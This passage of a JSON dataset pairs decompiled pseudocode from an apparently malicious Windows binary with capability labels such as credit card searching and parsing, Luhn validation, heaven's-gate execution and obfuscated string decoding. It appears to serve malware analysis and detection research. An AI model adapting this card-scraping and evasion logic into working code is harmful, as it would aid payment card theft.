{\n                *puVar1 = (puVar1 + -unaff_ESI + 1)[unaff_ESI] >> (uVar2 & 0x1f) | uVar3;\n            }\n            puVar1 = puVar1 + 1;\n        } while (-unaff_ESI + -8 + puVar1 < iVar4);\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "004095c4": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint fcn.004095c4(void)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    uVar2 = *0x43355c;\n    if (in_EAX == 0) {\n        return 0;\n    }\n    if (*0x433568 == 0x12345678) {\n        uVar1 = rdtsc();\n        *0x433568 = uVar1;\n    }\n    *0x433568 = *0x433568 << 0xb ^ *0x433568;\n    uVar3 = (*0x433564 >> 0xb ^ *0x433568) >> 8 ^ *0x433564 ^ *0x433568;\n    *0x43355c = *0x433560;\n    *0x433560 = *0x433564;\n    *0x433564 = uVar3;\n    *0x433568 = uVar2;\n    return (uVar3 % (in_EAX * 100)) / 100;\n}\n",
        "token_count": 238
    },
    "00406ab7": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406ab7(uint32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == (arg_8h & 0xfffffffc)) {\n        return arg_8h;\n    }\n    return (arg_8h & 0xfffffffc) + 4;\n}\n",
        "token_count": 77
    },
    "0040c75a": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t fcn.0040c75a(void)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    char16_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h = *0x413094;\n    uVar5 = 0;\n    var_28h = *0x43470c;\n    var_ch = 0;\n    var_3ch = 0x30;\n    var_38h = 0;\n    var_30h = 0;\n    var_2ch = 0x118;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = L\"ExtraWnd1\";\n    var_10h = 0;\n    iVar2 = (**0x4130c8)(&var_3ch);\n    if ((iVar2 != 0) && (var_4h = (**0x413090)(0, L\"ExtraWnd1\", 0, 0, 0, 0, 0, 0, 0, 0, *0x43470c, 0),  var_4h != 0)) {\n        var_14h = L\"ExtraWnd2\";\n        var_2ch = 0x130;\n        iVar2 = (**0x4130c8)(&var_3ch);\n        if ((iVar2 != 0) && (var_8h = (**0x413090)(0, L\"ExtraWnd2\", 0, 0, 0, 0, 0, 0, 0, 0, *0x43470c, 0),  var_8h != 0)\n           ) {\n            iVar3 = fcn.0040c2fa(var_4h);\n            piVar4 = fcn.0040c2fa(var_8h);\n            pcVar1 = _sym.imp.USER32.dll_DestroyWindow;\n            if ((iVar3 != 0) && (piVar4 != NULL)) {\n                if (*0x434748 >> 2 != 0) {\n                    iVar3 = iVar3 - piVar4;\n                    do {\n                        if ((*(iVar3 + piVar4) == 0x118) && (*piVar4 == 0x130)) {\n                            var_ch = uVar5 << 2;\n                            break;\n                        }\n                        uVar5 = uVar5 + 1;\n                        piVar4 = piVar4 + 1;\n                    } while (uVar5 < *0x434748 >> 2);\n                }\n                (*_sym.imp.USER32.dll_DestroyWindow)(var_4h);\n                (*pcVar1)(var_8h);\n                return var_ch;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 740
    },
    "0040d479": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t fcn.0040d479(void)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    char16_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h = *0x413094;\n    uVar5 = 0;\n    var_28h = *0x43470c;\n    var_ch = 0;\n    var_3ch = 0x30;\n    var_38h = 0;\n    var_30h = 0;\n    var_2ch = 0x118;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = L\"ExtraWnd1\";\n    var_10h = 0;\n    iVar2 = (**0x4130c8)(&var_3ch);\n    if ((iVar2 != 0) && (var_4h = (**0x413090)(0, L\"ExtraWnd1\", 0, 0, 0, 0, 0, 0, 0, 0, *0x43470c, 0),  var_4h != 0)) {\n        var_14h = L\"ExtraWnd2\";\n        var_2ch = 0x130;\n        iVar2 = (**0x4130c8)(&var_3ch);\n        if ((iVar2 != 0) && (var_8h = (**0x413090)(0, L\"ExtraWnd2\", 0, 0, 0, 0, 0, 0, 0, 0, *0x43470c, 0),  var_8h != 0)\n           ) {\n            iVar3 = fcn.0040d168(var_4h);\n            piVar4 = fcn.0040d168(var_8h);\n            pcVar1 = _sym.imp.USER32.dll_DestroyWindow;\n            if ((iVar3 != 0) && (piVar4 != NULL)) {\n                if (*0x4347d8 >> 2 != 0) {\n                    iVar3 = iVar3 - piVar4;\n                    do {\n                        if ((*(iVar3 + piVar4) == 0x118) && (*piVar4 == 0x130)) {\n                            var_ch = uVar5 << 2;\n                            break;\n                        }\n                        uVar5 = uVar5 + 1;\n                        piVar4 = piVar4 + 1;\n                    } while (uVar5 < *0x4347d8 >> 2);\n                }\n                (*_sym.imp.USER32.dll_DestroyWindow)(var_4h);\n                (*pcVar1)(var_8h);\n                return var_ch;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 741
    },
    "0040b8bc": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040b8bc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint32_t uVar5;\n    uint *arg_8h_00;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    fcn.00407c1d(0x4124e8, 9, 0x9bd15f6e);\n    uVar1 = fcn.00402cec();\n    if (uVar1 != 0) {\n        arg_8h_00 = &var_2ch;\n        var_8h = uVar1;\n        fcn.00407c1d(0x4122d4, 4, 0xd7d1451a, extraout_ECX);\n        fcn.00402cec();\n        fcn.00402e0b();\n        uVar1 = fcn.0040a9dc(arg_8h_00);\n        if ((uVar1 != 0) && (var_14h = uVar1,  uVar1 = (**0x4130bc)(0),  uVar1 != 0)) {\n            var_2ch = uVar1;\n            iVar2 = (**0x41375c)(uVar1);\n            if (iVar2 != 0) {\n                var_ch = (**0x413760)(uVar1, 8);\n                var_10h = (**0x413760)(uVar1, 10);\n                var_18h = (**0x413744)(uVar1, var_ch, var_10h);\n                if (var_18h != 0) {\n                    var_28h = (**0x41373c)(iVar2, var_18h);\n                    uVar3 = (**0x413760)(uVar1, 0x5a, 0x48);\n                    fcn.00407c1d(0x4124f4, 4, 0x707f2d92, uVar3);\n                    fcn.00402cec();\n                    uVar3 = fcn.00402da4();\n                    iVar4 = (**0x413404)(uVar3);\n                    uVar3 = fcn.00407c34(0x4124fc, 8, 0x18b6feee);\n                    var_24h = (**0x413748)(-iVar4, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 4, 0, uVar3);\n                    if (var_24h != 0) {\n                        var_20h = (**0x41373c)(iVar2, var_24h);\n                        fcn.00407c1d(0x412508, 10, 0x251ccd27);\n                        fcn.00402cec();\n                        uVar3 = fcn.00402da4();\n                        (**0x413730)(iVar2, uVar3);\n                        fcn.00407c1d(0x412514, 5, 0x1e4f21c0);\n                        fcn.00402cec();\n                        uVar3 = fcn.00402da4();\n                        (**0x413758)(iVar2, uVar3);\n                        var_44h = var_ch;\n                        var_3ch = 0;\n                        var_38h = 0;\n                        var_34h = var_ch;\n                        var_30h = var_10h;\n                        uVar3 = (**0x413750)(2);\n                        (**0x4130c4)(iVar2, &var_3ch, uVar3);\n                        uVar5 = (var_10h * var_44h) / 10;\n                        var_40h = var_10h;\n                        uVar1 = var_8h;\n                        while (var_8h = uVar5,  var_10h = var_40h,  var_8h != 0) {\n                            uVar1 = fcn.004095c4();\n                            var_1ch = (uVar1 & 0xff) << 8;\n                            uVar1 = fcn.004095c4();\n                            uVar5 = uVar1 & 0xff | var_1ch;\n                            uVar1 = fcn.004095c4();\n                            uVar3 = fcn.004095c4(uVar1 & 0xff | uVar5 << 8);\n                            uVar3 = fcn.004095c4(uVar3);\n                            (*str.P__._0_4_)(iVar2, uVar3);\n                            uVar1 = var_8h - 1;\n                            var_40h = var_10h;\n                            var_44h = var_ch;\n                            uVar5 = uVar1;\n                        }\n                        var_4ch = 0;\n                        var_48h = 0;\n                        var_8h = uVar1;\n                        (**0x4130c0)(iVar2, var_14h, 0xffffffff, &var_4ch, 0x411);\n                        var_38h = var_30h / 2 - var_40h / 2;\n                        (**0x4130c0)(iVar2, var_14h, 0xffffffff, &var_3ch, 0x11);\n                        var_1h._0_1_ = fcn.0040b66f(var_18h, arg_ch, arg_10h, arg_14h);\n                        (**0x41373c)(iVar2, var_20h);\n                        (**0x413738)(var_24h);\n                    }\n                    (**0x41373c)(iVar2, var_28h);\n                    (**0x413738)(var_18h);\n                    uVar1 = var_2ch;\n                }\n                (**0x413754)(iVar2);\n            }\n            uVar1 = (**0x4130b4)(0, uVar1);\n        }\n    }\n    return uVar1 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1557
    },
    "00406313": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406313(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint8_t *in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint8_t var_2h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *(in_EAX + 0x100);\n    var_2h = *(in_EAX + 0x101);\n    if (in_EDX != 0) {\n        arg_8h = arg_8h - in_ECX;\n        var_8h = in_EDX;\n        do {\n            var_1h._0_1_ = var_1h + 1;\n            uVar2 = var_1h;\n            uVar1 = *(uVar2 + in_EAX);\n            var_2h = var_2h + uVar1;\n            *(uVar2 + in_EAX) = *(var_2h + in_EAX);\n            *(var_2h + in_EAX) = uVar1;\n            *in_ECX = *((*(uVar2 + in_EAX) + uVar1 & 0xff) + in_EAX) ^ in_ECX[arg_8h];\n            in_ECX = in_ECX + 1;\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    *(in_EAX + 0x100) = var_1h;\n    *(in_EAX + 0x101) = var_2h;\n    return;\n}\n",
        "token_count": 405
    },
    "004068b3": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nint32_t fcn.004068b3(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_FS_OFFSET;\n    uint var_1ch;\n    \n    piVar1 = *(*(*(in_FS_OFFSET + 0x30) + 0xc) + 0xc);\n    piVar3 = piVar1;\n    while( true ) {\n        iVar2 = fcn.0040686e();\n        if (iVar2 == 0) {\n            return piVar3[6];\n        }\n        piVar3 = *piVar3;\n        if (piVar3[6] == 0) break;\n        if (piVar3 == piVar1) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 180
    },
    "0040c295": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid fcn.0040c295(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00409029": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00409029(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_24h;\n    uint var_20h;\n    \n    var_24h = 0;\n    puVar2 = &var_20h;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (**0x41349c)(&var_24h);\n    return var_24h == 9;\n}\n",
        "token_count": 143
    },
    "00408380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nint32_t fcn.00408380(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint16_t **unaff_ESI;\n    \n    puVar3 = *unaff_ESI;\n    iVar2 = 0;\n    while( true ) {\n        uVar1 = *puVar3;\n        if ((uVar1 < 0x30) || (0x39 < uVar1)) break;\n        iVar2 = iVar2 * 10 + -0x30 + uVar1;\n        puVar3 = puVar3 + 1;\n    }\n    *unaff_ESI = puVar3;\n    return iVar2;\n}\n",
        "token_count": 156
    },
    "00408954": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nint32_t fcn.00408954(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char **unaff_ESI;\n    \n    iVar2 = 0;\n    for (pcVar3 = *unaff_ESI; (cVar1 = *pcVar3,  '/' < cVar1 && (cVar1 < ':')); pcVar3 = pcVar3 + 1) {\n        iVar2 = iVar2 * 10 + -0x30 + cVar1;\n    }\n    *unaff_ESI = pcVar3;\n    return iVar2;\n}\n",
        "token_count": 136
    },
    "0040e854": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e854(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_208h;\n    \n    (**0x41343c)(arg_8h, &var_208h, 0x104);\n    if (var_208h != 0x25) {\n        *0x433858 = fcn.00406c8c();\n        if (*0x433858 != 0) {\n            uVar2 = (**0x4133a4)(&var_208h);\n            (**0x4130b0)(&var_208h, uVar2);\n            uVar2 = fcn.00407c4b();\n            iVar1 = *0x4338bc;\n            *0x4338bc = *0x4338bc + 1;\n            *(*0x433858 + iVar1 * 4) = uVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "0040fba1": {
        "rules": [
            "search for credit card data/546f8dc683b8415fa126b38355d21de5",
            "parse credit card information/2fba96855ce44cd2afbbefaf4df20b4d"
        ],
        "decompiled_code": "\nuint32_t fcn.0040fba1(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0;\n    uVar1 = fcn.004068b3();\n    uVar3 = 0;\n    if ((uVar1 != 0) && (uVar1 = fcn.0040698c(uVar1, 0x6e682f73, 1, 0),  str.s_hn._0_4_ = uVar1,  uVar1 != 0)) {\n        do {\n            uVar1 = fcn.0040fb44();\n            uVar2 = uVar1;\n            if (uVar2 == 0) break;\n            uVar3 = uVar3 + 4;\n        } while (uVar3 < 0x44);\n    }\n    return uVar1 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 215
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    char *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint var_78h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    // [00] -r-x section size 65536 named .text\n    fcn.00410580(0x4129e8, 0x68);\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -4) = 0;\n    uVar2 = (**0x4133a8)(extraout_ECX);\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    uVar2 = fcn.00407c1d(0x411cf8, 4, 0xd0152fd1);\n    *(unaff_EBP + -0x30) = uVar2;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + 8);\n    pcVar5 = extraout_ECX;\n    while (*(unaff_EBP + -0x1c) != 0) {\n        if (*pcVar5 == '-') {\n            uVar2 = fcn.00407c1d(0x411d00, 2, 0xf4139a24);\n            iVar3 = (**0x41317c)(pcVar5, uVar2);\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 - pcVar5;\n            pcVar5 = pcVar5 + iVar3;\n            *(unaff_EBP + -0x24) = pcVar5;\n            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) - iVar3;\n        }\n        *(unaff_EBP + -0x78) = 0;\n        sub.ntdll.dll_memset(unaff_EBP + -0x77, 0, 0x40);\n        for (uVar4 = 0; (*(unaff_EBP + -0x34) = uVar4,  *(unaff_EBP + -0x1c) != 0 && (uVar4 < 0x40)); uVar4 = uVar4 + 1)\n        {\n            iVar3 = (**0x413178)(pcVar5, *(unaff_EBP + -0x30));\n            pcVar5 = pcVar5 + iVar3;\n            *(unaff_EBP + -0x24) = pcVar5;\n            piVar1 = unaff_EBP + -0x1c;\n            *piVar1 = *piVar1 - iVar3;\n            if (*piVar1 == 0) break;\n            *(unaff_EBP + -0x78 + uVar4) = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n            *(unaff_EBP + -0x24) = pcVar5;\n            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -1;\n        }\n        if (uVar4 == 0) break;\n        *(unaff_EBP + -0x2c) = uVar4;\n        iVar3 = (**0x4137ac)(unaff_EBP + -0x78, uVar4, 1, *(unaff_EBP + -0x20), unaff_EBP + -0x2c, 0, 0);\n        if (iVar3 == 0) break;\n        *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + *(unaff_EBP + -0x2c);\n        if (*(unaff_EBP + -0x20) != 0) {\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + *(unaff_EBP + -0x2c);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 1067
    },
    "00401209": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401209(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    int32_t arg_10h;\n    \n    arg_8h = *0x43359c;\n    iVar1 = *0x43358c;\n    arg_10h = 0;\n    if ((*0x43359c != 0) && (*0x43358c != 0)) {\n        fcn.004011e3(*0x43359c, *0x43358c);\n        arg_10h = fcn.00406c7f();\n        if (arg_10h != 0) {\n            iVar1 = fcn.004011b0(arg_8h, iVar1, arg_10h);\n            if (iVar1 == 0) {\n                fcn.00406d25();\n                arg_10h = 0;\n            }\n            else {\n                *(iVar1 + arg_10h) = 0;\n                *0x433dc8 = iVar1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 241
    },
    "00401270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401270(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uchar auStack4 [4];\n    \n    iVar1 = *0x414100;\n    if (*0x414100 != 0) {\n        iVar1 = 0;\n        arg_8h = fcn.0040fec1(0x4140f0, 0x414104);\n        if (arg_8h != 0) {\n            iVar1 = fcn.00402ec5(arg_8h, *0x414100, auStack4);\n            fcn.00406d25();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 151
    },
    "00402150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00402150(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.004020ed(&var_4h);\n    if (iVar1 != 0) {\n        *0x4335b0 = fcn.00410437(iVar1, var_4h);\n        if (*0x4335b0 != 0) {\n            iVar1 = fcn.0041002f(*0x4335b0);\n            uVar2 = iVar1 - 0xbU & 0xffff;\n            uVar3 = uVar2 - 0x17;\n            if (0xf < uVar3) {\n                uVar3 = 0x10;\n            }\n            *0x433598 = *0x433598 & 0xffff0000 | uVar3 & 0xffff;\n            *0x4335a0 = (uVar2 - (uVar3 & 0xffff)) - 0x17;\n            *0x433580 = *0x4335a0 + 0x17 + (uVar3 & 0xffff);\n            var_4h = 0;\n            iVar1 = fcn.004020fe(&var_4h);\n            if (iVar1 != 0) {\n                fcn.0040fc0e(iVar1, var_4h, 0x4335b4);\n                *0x43359c = fcn.00401127(iVar1);\n                fcn.00406d25();\n            }\n            if (*0x43359c == 0) {\n                (**0x4137e0)(*0x4335b0);\n                *0x4335b0 = 0;\n            }\n        }\n        fcn.00406d6b();\n    }\n    return *0x4335b0 != 0;\n}\n",
        "token_count": 434
    },
    "00402519": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00402519(uint arg_8h, uint arg_ch)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00410580(0x412978, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.00407d14(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    *(unaff_EBP + -4) = 0xffffffff;\n    (**0x413368)(*(unaff_EBP + -0x1c));\n    fcn.00406d25();\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 202
    },
    "00403780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00403780(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00410580(0x4128d8, 0xc);\n    uVar2 = (**0x4133c8)();\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -4) = 0;\n    cVar1 = fcn.00408dfb(extraout_ECX, 0x20);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00403688(extraout_ECX);\n        if (cVar1 != '\\0') {\n            iVar3 = (**0x4134f8)();\n            if (*(extraout_ECX + 4) == iVar3) {\n                *(extraout_ECX + 4) = 0;\n            }\n            (**0x4133f0)(extraout_ECX + 8);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    (**0x413460)(*(unaff_EBP + -0x1c));\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 314
    },
    "004029ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004029ef(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_cch;\n    \n    puVar2 = &var_cch;\n    uVar1 = fcn.00407c34(0x411f34, 0x1c, 0xbf98d64e);\n    fcn.0040915e(uVar1, puVar2);\n    puVar2 = &var_cch;\n    uVar1 = fcn.00407c34(0x411f54, 8, 0x19d150ea);\n    fcn.00407d76(arg_8h, uVar1, puVar2);\n    return;\n}\n",
        "token_count": 161
    },
    "00402f1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00402f1c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t *unaff_ESI;\n    \n    uVar1 = (**0x413178)();\n    if (uVar1 != 0) {\n        if (uVar1 < *unaff_ESI) {\n            *unaff_ESI = *unaff_ESI - uVar1;\n            in_EAX = in_EAX + uVar1;\n        }\n        else {\n            in_EAX = 0;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "00402f42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402f42(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    *unaff_EDI = *unaff_EDI - in_EAX;\n    iVar1 = *unaff_EDI;\n    uVar2 = fcn.00407c1d(0x411f90, 4, 0x22ccf755);\n    iVar3 = fcn.00402f1c(uVar2);\n    iVar4 = in_EAX + param_1;\n    if (iVar3 != 0) {\n        *unaff_EDI = iVar1;\n        iVar4 = iVar3;\n    }\n    return iVar4;\n}\n",
        "token_count": 195
    },
    "00402f82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402f82(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *arg_ch_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00407c1d(0x411f90, 4, 0x22ccf755);\n    var_4h = fcn.00402f1c(uVar1);\n    if (var_4h != 0) {\n        var_10h = 0;\n        var_ch = 0;\n        arg_ch_00 = &var_10h;\n        uVar1 = fcn.00407c1d(0x411f80, 5, 0x35e59f22);\n        iVar2 = fcn.00408010(uVar1, arg_ch_00);\n        if (iVar2 == 0) {\n            var_4h = 0;\n        }\n        else {\n            *(arg_8h + 0x20) = var_10h;\n            *(arg_8h + 0x24) = var_ch;\n            uVar1 = fcn.00407c1d(0x411f98, 0xf, 0x5beb9a61);\n            var_4h = fcn.00402f1c(uVar1);\n            if (var_4h != 0) {\n                uVar1 = fcn.00407c1d(0x411f90, 4, 0x22ccf755);\n                var_4h = fcn.00402f1c(uVar1);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 393
    },
    "004034f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004034f3(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    uVar2 = fcn.00407c1d(0x411f90, 4, 0x22ccf755);\n    pcVar3 = fcn.00402f1c(uVar2);\n    if (pcVar3 != NULL) {\n        uVar2 = fcn.00407c1d(0x411f88, 4, 0xc5a3ff84, 4);\n        iVar4 = (**0x413164)(pcVar3, uVar2);\n        if (iVar4 == 0) {\n            pcVar3 = fcn.00402f42();\n            *(arg_8h + 0x14) = 1;\n        }\n        else {\n            uVar2 = fcn.00407c1d(0x411f78, 5, 0xbf28c133, 5);\n            iVar4 = (**0x413164)(pcVar3, uVar2);\n            if (iVar4 == 0) {\n                *(arg_8h + 0x20) = 0;\n            }\n            else {\n                uVar2 = fcn.00407c1d(0x411f70, 4, 0x656dc27d, 4);\n                iVar4 = (**0x413164)(pcVar3, uVar2);\n                if (iVar4 != 0) {\n                    cVar1 = *pcVar3;\n                    if (cVar1 == '\\\"') {\n                        pcVar3 = fcn.00403041(arg_8h, pcVar3, arg_10h);\n                        